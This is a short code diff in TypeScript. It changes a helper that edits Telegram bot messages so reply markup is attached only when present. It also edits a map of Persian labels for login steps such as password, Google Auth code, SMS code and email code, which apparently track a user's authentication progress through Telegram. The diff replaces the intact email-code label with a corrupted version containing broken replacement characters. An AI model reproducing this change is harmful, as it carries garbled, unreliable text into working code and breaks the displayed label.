@@ -701,13 +701,17 @@ const updateTelegramMessage = async (
   }
 
   try {
-    const payload = {
+    const payload: any = {
       chat_id: TELEGRAM_CHAT_ID,
       message_id: messageId,
       text: text.substring(0, 4096), // Telegram message limit
       parse_mode: "HTML",
-      reply_markup: replyMarkup,
     };
+
+    // Only add reply_markup if it's not null/undefined
+    if (replyMarkup) {
+      payload.reply_markup = replyMarkup;
+    }
 
     console.log("🔄 Updating Telegram message:", {
       messageId,
@@ -774,7 +778,7 @@ const getCurrentStepText = (step: string): string => {
     auth_password: "وارد کردن رمز عبور",
     auth_google: "وارد کردن کد Google Auth",
     auth_sms: "وارد کردن کد پیامک",
-    auth_email: "وارد کردن کد ایمیل",
+    auth_email: "و��رد کردن کد ایمیل",
     completed: "تکمیل شده",
   };
 
